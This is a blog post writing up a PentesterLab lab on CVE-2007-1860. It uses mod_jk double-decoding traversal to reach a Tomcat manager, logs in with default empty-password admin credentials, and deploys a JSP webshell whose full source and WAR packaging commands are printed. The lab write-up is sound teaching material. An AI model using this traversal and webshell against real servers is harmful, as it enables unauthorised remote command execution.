---
layout: post
title: "Pentesterlab--cve-2007-1860"
date: 2016-04-05 13:04:47 -0400
comments: true
categories: [pentesterlab, mod_jk double-decoding, cve-2007-1860]
---

*By means of these seven considerations I can forecast victory or defeat.* ----- The Art of War

This course details the exploitation of a vulnerability in mod_jk and how by using this issue it is possible to access the administration interface of a Tomcat server (Tomcat's manager). Then using this access, we will see how an attacker can use default credentials to log in as administrator and use this access to gain code execution on the server. ---Pentesterlab

Difficluty: 2/5
<!--more-->

###Forces:

* Nmap
* NC 
* Firebug
* webshell

###Detail Assessment and Planning

* Port scan to identify opened ports, running services and services version. ----- Nmap
* Check http headers. ----- NC
* Exploit and upload webshell. ---- Firebug


###Waging War

####Weaknesses and Strengths

Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.

{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_010.png   [title manually exploit [alt text]] %}

By checking the application HTTP headers with nc, I can also get Apache service version.

```
GET / HTTP/1.1
Host: 192.168.79.168
``` 

{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_011.png  [title manually exploit [alt text]] %}

####Attack

First of all, we need to figure out the architecture of Tomcat and Apache. Read [here](https://pentesterlab.com/exercises/cve-2007-1860/course)

If we try to visit a non-exist page, we will receive 404 error like that:

{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_001.png  [title manually exploit [alt text]] %}

Based on the result, we know the http request is processed by Apache.

If we try to visit page like 192.168.79.168/examples/jsp/test404, we will get the 404 error like:

{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_002.png  [title manually exploit [alt text]] %}

Then we know that the http request is processed by Tomcat through Apache.


Tomcat Manager is available at the following URI: /manager/html and is, most of the time, protected by a password. The CVE-2007-1860 vulnerability is described [advisory](http://mail-archives.apache.org/mod_mbox/tomcat-dev/200706.mbox/%3C4667755F.6070700@apache.org%3E)

From pentesterlab,

*If you provide this %252e to a vulnerable modjk, it will perform a first decoding and send the value %2e to Tomcat. Tomcat will then perform a second decoding to get the value .. If you use %252e%252e, you will then be able to send .. to Tomcat. If you try to send .. directly to Apache, it will not forward the request to Tomcat unless the path resolve to a path configured to be forwarded to Tomcat (using `modjk`).*

Now we know how to access the /manager/html, (Sometimes you may need to repeat several times %252e%252e/)

`http://192.168.79.168/examples/jsp/%252e%252e/%252e%252e/manager/html`

{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_003.png  [title manually exploit [alt text]] %}

The credentials are one of the default ones. In this exerciese, the admin didn't change the credentials. The user name is admin and password is empty. Once we get it, we are able to get acces to the Tomcat Manager.

{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_004.png  [title manually exploit [alt text]] %}


Now we need to create a webshell and upload it to the Tomcat.


####Deploy a webshell

webshell (from pentesterlab, you may generate it using msfvenom)


```jsp index.jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>

```

now we have to  pack the webshell

```
$ mkdir webshell
$ cp index.jsp webshell

$ cd webshell
$ jar -cvf ../webshell.war *

```

webshell `webshell.war` is ready to fire.

####Upload webshell

We can use the form to upload war file:
{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_005.png  [title manually exploit [alt text]] %}

However, it will give you a 404 page since the deployment url does not use the double -encoding trick to gain access to get the manager. So we have to use firebug to give the form right location.

{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_006.png  [title manually exploit [alt text]] %}

change the location to :

{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_007.png  [title manually exploit [alt text]] %}

After successful uploading webshell, it will show in the Tomcat manager:

{% img  /images/blog/pentesterlab/cve_2007_1860/Selection_008.png  [title manually exploit [alt text]] %}

now enjoy the webshell by accessing

`http://192.168.79.168/examples/%252e%252e/webshell/`

 {% img  /images/blog/pentesterlab/cve_2007_1860/Selection_009.png  [title manually exploit [alt text]] %}


DONE

{% img  /images/blog/pentesterlab/shellshock/game_over.jpg [title manually exploit [alt text]] %}
